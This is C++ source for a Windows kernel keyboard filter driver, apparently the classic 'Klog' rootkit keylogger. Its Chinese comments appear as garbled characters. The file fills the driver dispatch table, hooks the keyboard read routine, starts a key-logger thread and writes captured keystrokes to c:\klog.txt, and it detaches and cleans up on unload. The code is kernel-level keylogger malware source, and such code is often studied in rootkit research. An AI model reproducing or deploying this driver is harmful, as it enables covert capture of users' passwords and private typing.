extern "C"
{
	#include "ntddk.h"
}

#include "ntddkbd.h"
#include "Klog.h"
#include "KbdHook.h"
#include "KbdLog.h"
#include "ScanCode.h"

int numPendingIrps = 0;

//  DriverEntry

// �ж�����ȼ�Ϊ passive
extern "C" NTSTATUS DriverEntry( IN PDRIVER_OBJECT  pDriverObject, IN PUNICODE_STRING RegistryPath )
{
	NTSTATUS Status = {0};

	DbgPrint("Keyboard Filter Driver - DriverEntry\n");

	for(int i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
		pDriverObject->MajorFunction[i] = DispatchPassDown;
	DbgPrint("Filled dispatch table with generic pass down routine...\n");

	//��ȷ�������豸
	pDriverObject->MajorFunction[IRP_MJ_READ] = DispatchRead;

	//��ס����
	HookKeyboard(pDriverObject);
	DbgPrint("Hooked IRP_MJ_READ routine...\n");

	// ���ù����߳̿����ļ���ɨ��ֵ��д����
	InitThreadKeyLogger(pDriverObject);

	//��ʼ����ֵ��ȡ����е�����
	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;
	InitializeListHead(&pKeyboardDeviceExtension->QueueListHead);

	//��ʼ��������
	KeInitializeSpinLock(&pKeyboardDeviceExtension->lockQueue);

	//��ʼ���������б���
	KeInitializeSemaphore(&pKeyboardDeviceExtension->semQueue, 0 , MAXLONG);

	//������־�ļ�
	IO_STATUS_BLOCK file_status;
	OBJECT_ATTRIBUTES obj_attrib;
	CCHAR		 ntNameFile[64] = "\\DosDevices\\c:\\klog.txt";
    STRING		 ntNameString;
	UNICODE_STRING uFileName;
    RtlInitAnsiString( &ntNameString, ntNameFile);
    RtlAnsiStringToUnicodeString(&uFileName, &ntNameString, TRUE );
	InitializeObjectAttributes(&obj_attrib, &uFileName, OBJ_CASE_INSENSITIVE, NULL, NULL);
	Status = ZwCreateFile(&pKeyboardDeviceExtension->hLogFile,GENERIC_WRITE,&obj_attrib,&file_status,
							NULL,FILE_ATTRIBUTE_NORMAL,0,FILE_OPEN_IF,FILE_SYNCHRONOUS_IO_NONALERT,NULL,0);
	RtlFreeUnicodeString(&uFileName);

	if (Status != STATUS_SUCCESS)
	{
		DbgPrint("Failed to create log file...\n");
		DbgPrint("File Status = %x\n",file_status);
	}
	else
	{
		DbgPrint("Successfully created log file...\n");
		DbgPrint("File Handle = %x\n",pKeyboardDeviceExtension->hLogFile);
	}

	//��������ж�ع���
	pDriverObject->DriverUnload = Unload;
	DbgPrint("Set DriverUnload function pointer...\n");
	DbgPrint("Exiting Driver Entry......\n");
	return STATUS_SUCCESS;
}

// �ж�����ȼ�Ϊ passive
NTSTATUS DispatchPassDown(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp )
{
	DbgPrint("Entering DispatchPassDown Routine...\n");
	//��irp���ݸ�Ŀ��
	IoSkipCurrentIrpStackLocation(pIrp);
	return IoCallDriver(((PDEVICE_EXTENSION) pDeviceObject->DeviceExtension)->pKeyboardDevice ,pIrp);
}//DriverDispatcher


// �ж�����ȼ�Ϊ passive
VOID Unload( IN PDRIVER_OBJECT pDriverObject)
{
	//��ȡ�豸��չ��ָ��
	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;
	DbgPrint("Driver Unload Called...\n");

	//�ͷű��󶨵��豸
	IoDetachDevice(pKeyboardDeviceExtension->pKeyboardDevice);
	DbgPrint("Keyboard hook detached from device...\n");

	//���豸�Ƴ�ǰ�ȴ�����˵�IRPs
	DbgPrint("There are %d tagged IRPs\n",numPendingIrps);
	DbgPrint("Waiting for tagged IRPs to die...\n");

	//Create a timer ������ʱ��
	KTIMER kTimer;
	LARGE_INTEGER  timeout;
	timeout.QuadPart = 1000000; //0.1 ��
	KeInitializeTimer(&kTimer);

	while(numPendingIrps > 0)
	{
		//����ʱ��
		KeSetTimer(&kTimer,timeout,NULL);
		KeWaitForSingleObject(&kTimer,Executive,KernelMode,false ,NULL);
	}

	//����¼�Ĺ����߳���Ϊ��ֹ״̬
	pKeyboardDeviceExtension ->bThreadTerminate = true;

	//�����߳�
	KeReleaseSemaphore(&pKeyboardDeviceExtension->semQueue,0,1,TRUE);

	//�ȴ�����������ֹ
	DbgPrint("Waiting for key logger thread to terminate...\n");
	KeWaitForSingleObject(pKeyboardDeviceExtension->pThreadObj,
			Executive,KernelMode,false,NULL);
	DbgPrint("Key logger thread termintated\n");

	//�رռ�¼�ļ�
	ZwClose(pKeyboardDeviceExtension->hLogFile);

	//ж���豸
	IoDeleteDevice(pDriverObject->DeviceObject);
	DbgPrint("Tagged IRPs dead...Terminating...\n");

	return;
}

